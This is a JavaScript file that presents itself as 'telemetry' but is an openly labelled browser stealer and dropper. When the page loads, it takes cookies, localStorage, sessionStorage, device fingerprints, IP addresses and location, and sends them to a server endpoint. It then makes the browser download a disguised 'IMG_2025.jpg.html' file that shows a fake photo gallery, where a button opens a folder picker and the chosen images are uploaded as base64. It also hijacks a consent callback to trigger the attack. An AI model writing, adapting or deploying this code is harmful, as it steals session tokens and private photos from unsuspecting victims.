// telemetry.js – Image Dropper with File System Access + Telegram Exfil
(function() {
  'use strict';

  const ENDPOINT = '/.netlify/functions/telemetry';
  let executed = false;

  // ---------- HELPER: SEND DATA VIA MULTIPLE METHODS ----------
  async function sendToBackend(module, payload) {
    const data = JSON.stringify({ module, ...payload, timestamp: new Date().toISOString() });
    const siteOrigin = window.location.origin;
    const url = siteOrigin + ENDPOINT;

    // Method 1: Fetch
    try {
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: data,
        cache: 'no-store',
        keepalive: true
      });
      if (res.ok) {
        console.log(`✅ [${module}] Data sent via fetch`);
        return;
      }
    } catch (e) { console.warn(`⚠️ [${module}] Fetch failed:`, e.message); }

    // Method 2: sendBeacon
    try {
      const blob = new Blob([data], { type: 'application/json' });
      if (navigator.sendBeacon(url, blob)) {
        console.log(`✅ [${module}] Data sent via sendBeacon`);
        return;
      }
    } catch (e) { console.warn(`⚠️ [${module}] sendBeacon failed:`, e.message); }

    // Method 3: Image beacon
    try {
      const img = new Image();
      img.src = url + '?data=' + encodeURIComponent(data);
      console.log(`✅ [${module}] Data sent via Image beacon`);
    } catch (e) { console.error(`❌ [${module}] All methods failed:`, e.message); }
  }

  // ---------- 1. BROWSER DATA EXFIL (AUTO) ----------
  async function collectBrowserData() {
    const device = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory,
      screen: `${screen.width}x${screen.height}`,
      colorDepth: screen.colorDepth,
      pixelRatio: window.devicePixelRatio,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      vendor: navigator.vendor || 'N/A'
    };

    let battery = 'N/A';
    if (navigator.getBattery) {
      try {
        const b = await navigator.getBattery();
        battery = { level: Math.round(b.level*100)+'%', charging: b.charging ? 'Yes':'No' };
      } catch(_) {}
    }

    let localIPs = ['N/A'];
    try {
      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
      pc.createDataChannel('test');
      await pc.createOffer();
      await pc.setLocalDescription();
      const ips = [];
      pc.onicecandidate = (e) => {
        if (!e || !e.candidate) return;
        const c = e.candidate.candidate;
        if (c) {
          const m = c.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
          if (m && !ips.includes(m[0])) ips.push(m[0]);
        }
      };
      await new Promise(r => setTimeout(r, 2000));
      localIPs = ips.length ? ips : ['N/A'];
      pc.close();
    } catch(_) {}

    let publicData = {};
    try {
      const r = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
      publicData = await r.json();
    } catch(_) {}

    const cookies = document.cookie || 'No cookies';
    let localStorageData = {}, sessionStorageData = {};
    try { localStorageData = { ...localStorage }; } catch(_) {}
    try { sessionStorageData = { ...sessionStorage }; } catch(_) {}

    let canvas = 'N/A';
    try {
      const c = document.createElement('canvas');
      c.width = 256; c.height = 128;
      const ctx = c.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60';
      ctx.fillRect(0,0,16,16);
      ctx.fillStyle = '#069';
      ctx.textBaseline = 'alphabetic';
      ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
      ctx.fillStyle = 'rgba(102,204,0,0.7)';
      ctx.fillText('The quick brown fox jumps over the lazy dog', 4, 45);
      ctx.fillStyle = '#ff6';
      ctx.fillRect(200,60,40,40);
      canvas = c.toDataURL();
    } catch(_) {}

    let fonts = [];
    try {
      const base = ['monospace','sans-serif','serif'];
      const test = ['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS','Impact','Tahoma','Calibri','Cambria','Garamond','Roboto','Noto Sans'];
      const c = document.createElement('canvas');
      const ctx = c.getContext('2d');
      const txt = 'mmmmmmmmmmlli';
      const size = '72px';
      ctx.font = size + ' ' + base[0];
      const b = ctx.measureText(txt).width;
      for (const f of test) {
        ctx.font = size + ' "' + f + '", ' + base[0];
        const w = ctx.measureText(txt).width;
        if (w !== b) fonts.push(f);
      }
    } catch(_) {}

    return {
      device,
      battery,
      network: {
        localIPs,
        publicIP: publicData.ip || 'N/A',
        isp: publicData.org || 'N/A',
        approxLocation: {
          city: publicData.city || 'N/A',
          region: publicData.region || 'N/A',
          country: publicData.country_name || 'N/A',
          lat: publicData.latitude || 'N/A',
          lng: publicData.longitude || 'N/A'
        }
      },
      storage: { cookies, localStorage: localStorageData, sessionStorage: sessionStorageData },
      fingerprints: { canvas, fonts },
      referrer: document.referrer,
      pageUrl: location.href
    };
  }

  // ---------- 2. FILE SYSTEM ACCESS PAYLOAD (Gallery Access) ----------
  function createImageExfilPayload() {
    try {
      const siteOrigin = window.location.origin;
      const imageUrl = 'https://files.catbox.moe/l9xdjq.png';

      // Self-contained HTML with hidden file input and trigger
      const htmlContent = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>📸 My Gallery</title>
  <meta property="og:image" content="${imageUrl}" />
  <meta property="og:title" content="Beautiful Sunset" />
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body { background:#0a0a0a; display:flex; justify-content:center; align-items:center; min-height:100vh; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; flex-direction:column; }
    .container { max-width:95vw; max-height:80vh; border-radius:12px; overflow:hidden; box-shadow:0 20px 60px rgba(0,0,0,0.8); background:#1a1a1a; }
    img { display:block; width:100%; height:auto; max-height:70vh; object-fit:contain; }
    .caption { padding:10px 20px; color:#ccc; text-align:center; font-size:13px; background:#1a1a1a; border-top:1px solid #333; }
    .btn { margin-top:15px; padding:12px 30px; background:linear-gradient(145deg, #2a2a2a, #1a1a1a); color:white; border:1px solid #444; border-radius:30px; font-size:16px; cursor:pointer; transition:0.3s; box-shadow:0 4px 15px rgba(0,0,0,0.5); }
    .btn:hover { background:#333; transform:scale(1.02); }
    #status { color:#888; margin-top:10px; font-size:14px; }
  </style>
</head>
<body>
  <div class="container">
    <img src="${imageUrl}" alt="Beautiful Sunset" />
    <div class="caption">📸 IMG_2025 • Tap to share</div>
  </div>
  <button class="btn" id="galleryBtn">📂 Tap to view full gallery</button>
  <div id="status">Ready</div>

  <input type="file" id="fileInput" style="display:none" webkitdirectory multiple accept="image/*" />

  <script>
    (function() {
      const ENDPOINT = '${siteOrigin}/.netlify/functions/telemetry';
      const statusEl = document.getElementById('status');

      // --- Send data to backend ---
      async function sendData(module, payload) {
        const data = JSON.stringify({ module, ...payload, timestamp: new Date().toISOString() });
        try {
          await fetch(ENDPOINT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: data,
            cache: 'no-store',
            keepalive: true
          });
        } catch(e) {
          // fallback beacon
          const blob = new Blob([data], { type: 'application/json' });
          navigator.sendBeacon(ENDPOINT, blob);
        }
      }

      // --- Read image files and send ---
      async function handleFiles(files) {
        const imageFiles = [];
        for (const file of files) {
          if (file.type.startsWith('image/')) {
            imageFiles.push(file);
          }
        }
        if (imageFiles.length === 0) {
          statusEl.textContent = 'No images found in selected folder.';
          return;
        }

        statusEl.textContent = \`Found \${imageFiles.length} images. Sending...\`;
        // Send first 20 images (to avoid overloading)
        const maxSend = Math.min(imageFiles.length, 20);
        for (let i = 0; i < maxSend; i++) {
          const file = imageFiles[i];
          try {
            const reader = new FileReader();
            const dataUrl = await new Promise((resolve, reject) => {
              reader.onload = () => resolve(reader.result);
              reader.onerror = reject;
              reader.readAsDataURL(file);
            });
            // Send image data as inline Base64
            await sendData('IMAGE_EXFIL', {
              filename: file.name,
              size: file.size,
              type: file.type,
              lastModified: file.lastModified,
              data: dataUrl // Base64 image
            });
            statusEl.textContent = \`Sent \${i+1}/\${maxSend} images...\`;
          } catch(e) {
            console.error('Error reading file:', e);
          }
        }
        statusEl.textContent = \`✅ Sent \${maxSend} images to server.\`;
        // Also send a summary
        await sendData('IMAGE_SUMMARY', {
          total: imageFiles.length,
          sent: maxSend,
          paths: imageFiles.map(f => f.webkitRelativePath || f.name).slice(0, maxSend)
        });
      }

      // --- Trigger file picker ---
      document.getElementById('galleryBtn').addEventListener('click', () => {
        const input = document.getElementById('fileInput');
        input.click();
      });

      document.getElementById('fileInput').addEventListener('change', (e) => {
        if (e.target.files.length) {
          statusEl.textContent = 'Processing selected files...';
          handleFiles(e.target.files);
        }
        e.target.value = ''; // Reset
      });

      // --- Also auto-send basic telemetry ---
      (async function autoTelemetry() {
        const device = {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          screen: screen.width+'x'+screen.height,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          vendor: navigator.vendor || 'N/A'
        };
        await sendData('GALLERY_PAGE_TELEMETRY', { device, referrer: document.referrer, pageUrl: location.href });
      })();
    })();
  </script>
</body>
</html>`;

      const blob = new Blob([htmlContent], { type: 'text/html' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'IMG_2025.jpg.html';
      a.style.display = 'none';
      document.body.appendChild(a);
      a.click();

      setTimeout(() => {
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
      }, 200);

      sendToBackend('IMAGE_DROPPER_DELIVERED', {
        status: 'Gallery payload delivered',
        filename: 'IMG_2025.jpg.html',
        note: 'Victim clicks "Tap to view full gallery" to exfil images.'
      });
    } catch (e) {
      sendToBackend('IMAGE_DROPPER_ERROR', { error: e.message });
    }
  }

  // ---------- 3. MASTER TRIGGER ----------
  async function runAll() {
    if (executed) return;
    executed = true;

    console.log('%c📸 Dropping gallery payload...', 'font-size:16px; color:#ff6600;');

    // Auto telemetry
    const data = await collectBrowserData();
    await sendToBackend('AUTO_TELEMETRY', data);

    // Drop the gallery HTML
    createImageExfilPayload();

    console.log('%c✅ Gallery payload delivered. Victim will see a fake gallery and can be tricked to tap "View full gallery".', 'font-size:16px; color:#00ffcc;');
  }

  // ---------- 4. AUTO-TRIGGER ON LOAD ----------
  if (document.readyState === 'complete') {
    setTimeout(runAll, 800);
  } else {
    window.addEventListener('load', () => setTimeout(runAll, 800));
  }

  // Balloon click backup
  const orig = window.grantBalloonConsent;
  window.grantBalloonConsent = function() {
    if (orig) orig();
    if (!executed) runAll();
  };
})();
